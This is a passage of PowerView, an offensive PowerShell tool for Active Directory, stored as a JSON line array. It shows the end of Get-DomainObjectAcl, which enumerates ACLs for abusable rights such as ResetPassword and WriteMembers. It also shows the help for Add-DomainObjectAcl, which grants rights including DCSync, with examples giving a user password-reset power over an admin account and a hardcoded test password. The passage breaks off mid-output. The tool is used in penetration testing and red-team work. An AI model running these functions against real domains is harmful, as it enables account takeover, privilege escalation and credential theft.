'ResetPassword', 'WriteMembers')]","        $RightsFilter,","","        [ValidateNotNullOrEmpty()]","        [String]","        $Domain,","","        [ValidateNotNullOrEmpty()]","        [Alias('Filter')]","        [String]","        $LDAPFilter,","","        [ValidateNotNullOrEmpty()]","        [Alias('ADSPath')]","        [String]","        $SearchBase,","","        [ValidateNotNullOrEmpty()]","        [Alias('DomainController')]","        [String]","        $Server,","","        [ValidateSet('Base', 'OneLevel', 'Subtree')]","        [String]","        $SearchScope = 'Subtree',","","        [ValidateRange(1, 10000)]","        [Int]","        $ResultPageSize = 200,","","        [ValidateRange(1, 10000)]","        [Int]","        $ServerTimeLimit,","","        [Switch]","        $Tombstone,","","        [Management.Automation.PSCredential]","        [Management.Automation.CredentialAttribute()]","        $Credential = [Management.Automation.PSCredential]::Empty","    )","","    BEGIN {","        $SearcherArguments = @{","            'Properties' = 'samaccountname,ntsecuritydescriptor,distinguishedname,objectsid'","        }","","        if ($PSBoundParameters['Sacl']) {","            $SearcherArguments['SecurityMasks'] = 'Sacl'","        }","        else {","            $SearcherArguments['SecurityMasks'] = 'Dacl'","        }","        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }","        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }","        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }","        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }","        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }","        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }","        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }","        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }","        $Searcher = Get-DomainSearcher @SearcherArguments","","        $DomainGUIDMapArguments = @{}","        if ($PSBoundParameters['Domain']) { $DomainGUIDMapArguments['Domain'] = $Domain }","        if ($PSBoundParameters['Server']) { $DomainGUIDMapArguments['Server'] = $Server }","        if ($PSBoundParameters['ResultPageSize']) { $DomainGUIDMapArguments['ResultPageSize'] = $ResultPageSize }","        if ($PSBoundParameters['ServerTimeLimit']) { $DomainGUIDMapArguments['ServerTimeLimit'] = $ServerTimeLimit }","        if ($PSBoundParameters['Credential']) { $DomainGUIDMapArguments['Credential'] = $Credential }","","        # get a GUID -\u003e name mapping","        if ($PSBoundParameters['ResolveGUIDs']) {","            $GUIDs = Get-DomainGUIDMap @DomainGUIDMapArguments","        }","    }","","    PROCESS {","        if ($Searcher) {","            $IdentityFilter = ''","            $Filter = ''","            $Identity | Where-Object {$_} | ForEach-Object {","                $IdentityInstance = $_.Replace('(', '\\28').Replace(')', '\\29')","                if ($IdentityInstance -match '^S-1-.*') {","                    $IdentityFilter += \"(objectsid=$IdentityInstance)\"","                }","                elseif ($IdentityInstance -match '^(CN|OU|DC)=.*') {","                    $IdentityFilter += \"(distinguishedname=$IdentityInstance)\"","                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {","                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname","                        #   and rebuild the domain searcher","                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'","                        Write-Verbose \"[Get-DomainObjectAcl] Extracted domain '$IdentityDomain' from '$IdentityInstance'\"","                        $SearcherArguments['Domain'] = $IdentityDomain","                        $Searcher = Get-DomainSearcher @SearcherArguments","                        if (-not $Searcher) {","                            Write-Warning \"[Get-DomainObjectAcl] Unable to retrieve domain searcher for '$IdentityDomain'\"","                        }","                    }","                }","                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {","                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\\' + $_.ToString('X2') }) -join ''","                    $IdentityFilter += \"(objectguid=$GuidByteString)\"","                }","                elseif ($IdentityInstance.Contains('.')) {","                    $IdentityFilter += \"(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))\"","                }","                else {","                    $IdentityFilter += \"(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))\"","                }","            }","            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {","                $Filter += \"(|$IdentityFilter)\"","            }","","            if ($PSBoundParameters['LDAPFilter']) {","                Write-Verbose \"[Get-DomainObjectAcl] Using additional LDAP filter: $LDAPFilter\"","                $Filter += \"$LDAPFilter\"","            }","","            if ($Filter) {","                $Searcher.filter = \"(\u0026$Filter)\"","            }","            Write-Verbose \"[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $($Searcher.filter)\"","","            $Results = $Searcher.FindAll()","            $Results | Where-Object {$_} | ForEach-Object {","                $Object = $_.Properties","","                if ($Object.objectsid -and $Object.objectsid[0]) {","                    $ObjectSid = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value","                }","                else {","                    $ObjectSid = $Null","                }","","                try {","                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object['ntsecuritydescriptor'][0], 0 | ForEach-Object { if ($PSBoundParameters['Sacl']) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {","                        if ($PSBoundParameters['RightsFilter']) {","                            $GuidFilter = Switch ($RightsFilter) {","                                'ResetPassword' { '00299570-246d-11d0-a768-00aa006e0529' }","                                'WriteMembers' { 'bf9679c0-0de6-11d0-a285-00aa003049e2' }","                                Default { '00000000-0000-0000-0000-000000000000' }","                            }","                            if ($_.ObjectType -eq $GuidFilter) {","                                $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]","                                $_ | Add-Member NoteProperty 'ObjectSID' $ObjectSid","                                $Continue = $True","                            }","                        }","                        else {","                            $_ | Add-Member NoteProperty 'ObjectDN' $Object.distinguishedname[0]","                            $_ | Add-Member NoteProperty 'ObjectSID' $ObjectSid","                            $Continue = $True","                        }","","                        if ($Continue) {","                            $_ | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))","                            if ($GUIDs) {","                                # if we're resolving GUIDs, map them them to the resolved hash table","                                $AclProperties = @{}","                                $_.psobject.properties | ForEach-Object {","                                    if ($_.Name -match 'ObjectType|InheritedObjectType|ObjectAceType|InheritedObjectAceType') {","                                        try {","                                            $AclProperties[$_.Name] = $GUIDs[$_.Value.toString()]","                                        }","                                        catch {","                                            $AclProperties[$_.Name] = $_.Value","                                        }","                                    }","                                    else {","                                        $AclProperties[$_.Name] = $_.Value","                                    }","                                }","                                $OutObject = New-Object -TypeName PSObject -Property $AclProperties","                                $OutObject.PSObject.TypeNames.Insert(0, 'PowerView.ACL')","                                $OutObject","                            }","                            else {","                                $_.PSObject.TypeNames.Insert(0, 'PowerView.ACL')","                                $_","                            }","                        }","                    }","                }","                catch {","                    Write-Verbose \"[Get-DomainObjectAcl] Error: $_\"","                }","            }","        }","    }","}","","","function Add-DomainObjectAcl {","\u003c#",".SYNOPSIS","","Adds an ACL for a specific active directory object.","","AdminSDHolder ACL approach from Sean Metcalf (@pyrotek3): https://adsecurity.org/?p=1906","","Author: Will Schroeder (@harmj0y)  ","License: BSD 3-Clause  ","Required Dependencies: Get-DomainObject  ","",".DESCRIPTION","","This function modifies the ACL/ACE entries for a given Active Directory","target object specified by -TargetIdentity. Available -Rights are","'All', 'ResetPassword', 'WriteMembers', 'DCSync', or a manual extended","rights GUID can be set with -RightsGUID. These rights are granted on the target","object for the specified -PrincipalIdentity.","",".PARAMETER TargetIdentity","","A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),","SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)","for the domain object to modify ACLs for. Required. Wildcards accepted.","",".PARAMETER TargetDomain","","Specifies the domain for the TargetIdentity to use for the modification, defaults to the current domain.","",".PARAMETER TargetLDAPFilter","","Specifies an LDAP query string that is used to filter Active Directory object targets.","",".PARAMETER TargetSearchBase","","The LDAP source to search through for targets, e.g. \"LDAP://OU=secret,DC=testlab,DC=local\"","Useful for OU queries.","",".PARAMETER PrincipalIdentity","","A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),","SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)","for the domain principal to add for the ACL. Required. Wildcards accepted.","",".PARAMETER PrincipalDomain","","Specifies the domain for the TargetIdentity to use for the principal, defaults to the current domain.","",".PARAMETER Server","","Specifies an Active Directory server (domain controller) to bind to.","",".PARAMETER SearchScope","","Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).","",".PARAMETER ResultPageSize","","Specifies the PageSize to set for the LDAP searcher object.","",".PARAMETER ServerTimeLimit","","Specifies the maximum amount of time the server spends searching. Default of 120 seconds.","",".PARAMETER Tombstone","","Switch. Specifies that the searcher should also return deleted/tombstoned objects.","",".PARAMETER Credential","","A [Management.Automation.PSCredential] object of alternate credentials","for connection to the target domain.","",".PARAMETER Rights","","Rights to add for the principal, 'All', 'ResetPassword', 'WriteMembers', 'DCSync'.","Defaults to 'All'.","",".PARAMETER RightsGUID","","Manual GUID representing the right to add to the target.","",".EXAMPLE","","$Harmj0ySid = Get-DomainUser harmj0y | Select-Object -ExpandProperty objectsid","Get-DomainObjectACL dfm.a -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $Harmj0ySid}","","...","","Add-DomainObjectAcl -TargetIdentity dfm.a -PrincipalIdentity harmj0y -Rights ResetPassword -Verbose","VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local","VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (\u0026(|(samAccountName=harmj0y)))","VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local","VERBOSE: [Get-DomainObject] Get-DomainObject filter string:(\u0026(|(samAccountName=dfm.a)))","VERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local 'ResetPassword' on CN=dfm (admin),CN=Users,DC=testlab,DC=local","VERBOSE: [Add-DomainObjectAcl] Granting principal CN=harmj0y,CN=Users,DC=testlab,DC=local rights GUID '00299570-246d-11d0-a768-00aa006e0529' on CN=dfm (admin),CN=Users,DC=testlab,DC=local","","Get-DomainObjectACL dfm.a -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $Harmj0ySid }","","AceQualifier           : AccessAllowed","ObjectDN               : CN=dfm (admin),CN=Users,DC=testlab,DC=local","ActiveDirectoryRights  : ExtendedRight","ObjectAceType          : User-Force-Change-Password","ObjectSID              : S-1-5-21-890171859-3433809279-3366196753-1114","InheritanceFlags       : None","BinaryLength           : 56","AceType                : AccessAllowedObject","ObjectAceFlags         : ObjectAceTypePresent","IsCallback             : False","PropagationFlags       : None","SecurityIdentifier     : S-1-5-21-890171859-3433809279-3366196753-1108","AccessMask             : 256","AuditFlags             : None","IsInherited            : False","AceFlags               : None","InheritedObjectAceType : All","OpaqueLength           : 0","",".EXAMPLE","","$Harmj0ySid = Get-DomainUser harmj0y | Select-Object -ExpandProperty objectsid","Get-DomainObjectACL testuser -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $Harmj0ySid}","","[no results returned]","","$SecPassword = ConvertTo-SecureString 'Password123!'-AsPlainText -Force","$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)","Add-DomainObjectAcl -TargetIdentity testuser -PrincipalIdentity harmj0y -Rights ResetPassword -Credential $Cred -Verbose","VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain","VERBOSE: [Get-Domain] Extracted domain 'TESTLAB' from -Credential","VERBOSE: [Get-DomainSearcher] search string: LDAP://PRIMARY.testlab.local/DC=testlab,DC=local","VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection","VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (\u0026(|(|(samAccountName=harmj0y)(name=harmj0y))))","VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain","VERBOSE: [Get-Domain] Extracted domain 'TESTLAB' from -Credential","VERBOSE: [Get-DomainSearcher] search string